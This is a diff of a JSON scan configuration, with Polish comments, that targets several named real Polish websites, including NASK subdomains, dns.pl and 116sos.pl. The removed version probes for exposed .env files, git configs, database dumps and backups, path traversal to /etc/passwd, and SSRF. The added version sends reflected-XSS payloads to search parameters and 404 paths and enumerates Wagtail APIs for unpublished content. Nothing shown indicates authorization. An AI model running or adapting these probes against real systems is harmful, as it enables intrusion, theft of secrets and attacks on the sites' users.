@@ -1,60 +1,109 @@
 {
-  "run": "007",
-  "note": "Wave 3: pliki konfiguracyjne i backupy na wszystkich hostach z zakresu. GET, read-only. Kazda odpowiedz jest odejmowana od catch-all tego hosta, wiec SPA zwracajace 200 na wszystko nie da falszywych trafien. Forma macierzy: te same sciezki x kazdy host.",
+  "run": "009",
+  "note": "Wave 5: API CMS (Wagtail/Django /api/v2/) na 7 hostach + refleksje XSS z unikalnym markerem zzqx9. GET, read-only. Baseline jest teraz normalizowany (cyfry -> #), bo dns.pl dokleja do kazdej odpowiedzi unikalny _event_transid i bez tego wszystko wygladalo na 'interesujace'.",
   "matrix": {
     "hosts": [
-      "nask.pl",
       "dyzurnet.pl",
-      "dns.pl",
+      "science.nask.pl",
+      "bezpiecznymiesiac.pl",
       "oad.nask.pl",
       "zglos-dezinformacje.nask.pl",
-      "bezpiecznymiesiac.pl",
       "116sos.pl",
-      "pllum.org.pl",
-      "science.nask.pl",
-      "dataannotation.pllum.org.pl"
+      "dns.pl"
     ],
     "paths": [
-      { "path": "/.env", "note": "plik srodowiskowy z sekretami aplikacji" },
-      { "path": "/.env.local", "note": "wariant .env" },
-      { "path": "/.git/config", "note": "konfiguracja repo git -> pelne zrodla" },
-      { "path": "/.git/HEAD", "note": "wskaznik repo git" },
-      { "path": "/wp-config.php.bak", "note": "kopia konfiguracji WordPress z danymi bazy" },
-      { "path": "/backup.zip", "note": "archiwum kopii zapasowej" },
-      { "path": "/db.sql", "note": "zrzut bazy danych" },
-      { "path": "/server-status", "note": "status serwera Apache" }
+      { "path": "/api/v2/", "note": "korzen Wagtail API - listing endpointow" },
+      { "path": "/api/v2/pages/", "note": "Wagtail: wszystkie strony, takze nieopublikowane przy braku filtrowania" },
+      { "path": "/api/v2/documents/", "note": "Wagtail: dokumenty, czesto niepubliczne PDF-y" },
+      { "path": "/api/v2/images/", "note": "Wagtail: obrazy" },
+      { "path": "/admin/", "note": "identyfikacja CMS: 200 = panel logowania" },
+      { "path": "/search/?q=test", "note": "Wagtail: wyszukiwarka - czy indeksuje tresci niepubliczne" }
     ]
   },
   "probes": [
     {
-      "id": "sci-media-dotdot-encoded",
-      "url": "https://science.nask.pl/api/media/..%2f..%2f..%2f..%2fetc%2fpasswd",
-      "note": "science: traversal zakodowanym separatorem. Url::parse NIE traktuje '..%2f' jako segmentu '.'/'..', wiec zadanie wychodzi nietkniete, a serwer moze je zdekodowac"
+      "id": "xss-dns-q",
+      "url": "https://dns.pl/search-results?q=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "dns.pl (Drupal): czy parametr q trafia do HTML bez escapowania. Refleksja sama w sobie nie jest luka - oceniam okno wokol markera",
+      "snippet": true
     },
     {
-      "id": "sci-media-double-encoded",
-      "url": "https://science.nask.pl/api/media/%252e%252e%252f%252e%252e%252fetc%252fpasswd",
-      "note": "science: podwojne kodowanie - dziala, gdy dekoder jest wywolany dwa razy"
+      "id": "xss-dns-keys",
+      "url": "https://dns.pl/search-results?keys=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "dns.pl: parametr keys (domyslny w Drupal search)",
+      "snippet": true
     },
     {
-      "id": "sci-media-abs",
-      "url": "https://science.nask.pl/api/media/etc/passwd",
-      "note": "science: sciezka bez traversal, ale od korzenia"
+      "id": "xss-dns-search",
+      "url": "https://dns.pl/search-results?search=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "dns.pl: parametr search",
+      "snippet": true
     },
     {
-      "id": "sci-media-url",
-      "url": "https://science.nask.pl/api/media/https://science.nask.pl/robots.txt",
-      "note": "science: czy proxy mediow przyjmuje PELNY URL (SSRF), czy tylko sciezke"
+      "id": "xss-sci-s",
+      "url": "https://science.nask.pl/?s=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "science.nask.pl (WordPress): parametr s, typowe miejsce refleksji w naglowku wynikow",
+      "snippet": true
     },
     {
-      "id": "sci-media-robots",
-      "url": "https://science.nask.pl/api/media/robots.txt",
-      "note": "science: kontrola - czy /api/media serwuje dowolny plik spod roota aplikacji"
+      "id": "xss-sci-en-s",
+      "url": "https://science.nask.pl/en?s=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "science: ten sam parametr na wersji EN",
+      "snippet": true
     },
     {
-      "id": "zglos-static-env",
-      "url": "https://zglos-dezinformacje.nask.pl/api/sendForm/../.env",
-      "note": "zglos: normalizacja sciezki po stronie serwera (u nas zostaje w URL, serwer moze znormalizowac i podac .env)"
+      "id": "xss-sos-s",
+      "url": "https://116sos.pl/?s=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "116sos.pl: wyszukiwarka",
+      "snippet": true
+    },
+    {
+      "id": "xss-pllum-q",
+      "url": "https://pllum.org.pl/?q=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "pllum.org.pl (Nuxt): parametr q",
+      "snippet": true
+    },
+    {
+      "id": "xss-oad-q",
+      "url": "https://oad.nask.pl/?q=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "oad.nask.pl (Next.js): parametr q",
+      "snippet": true
+    },
+    {
+      "id": "xss-zglos-q",
+      "url": "https://zglos-dezinformacje.nask.pl/?q=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "zglos-dezinformacje: parametr q",
+      "snippet": true
+    },
+    {
+      "id": "xss-bm-s",
+      "url": "https://bezpiecznymiesiac.pl/?s=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "bezpiecznymiesiac: wyszukiwarka",
+      "snippet": true
+    },
+    {
+      "id": "xss-dyz-s",
+      "url": "https://dyzurnet.pl/?s=zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "dyzurnet: wyszukiwarka",
+      "snippet": true
+    },
+    {
+      "id": "xss-dns-404",
+      "url": "https://dns.pl/nieistniejaca-zzqx9%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
+      "reflect": "zzqx9",
+      "note": "dns.pl: czy sciezka trafia do strony 404 bez escapowania (Drupal czesto odbija adres)",
+      "snippet": true
     }
   ]
 }
